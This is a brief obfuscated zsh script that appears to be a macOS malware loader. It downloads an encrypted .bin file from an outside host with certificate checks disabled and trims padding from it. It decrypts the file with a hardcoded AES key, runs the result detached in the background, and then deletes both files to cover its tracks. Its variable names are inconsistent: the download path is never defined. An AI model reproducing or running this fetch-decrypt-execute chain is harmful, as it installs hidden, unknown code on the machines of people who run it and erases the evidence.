#!/bin/zsh
kt46y=$(mktemp /tmp/nzj88k.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m36de03f19542f956.bin" -o "$kt46yz" || exit 1
pw86sx=$(stat -f %z "$kt46yz"); abs6mfb=$(( pw86sx - 322 - 432 ))
tail -c +$(( 322 + 1 )) "$kt46yz" | head -c $abs6mfb | openssl enc -d -aes-256-cbc -k e74be30ca99f0c94e31ef476 -out "$kt46y" 2>/dev/null
[ -s "$kt46y" ] && chmod 700 "$kt46y" && ( "$kt46y" & ) && disown
( sleep 3; rm -f "$kt46y" "$kt46yz" ) &>/dev/null &
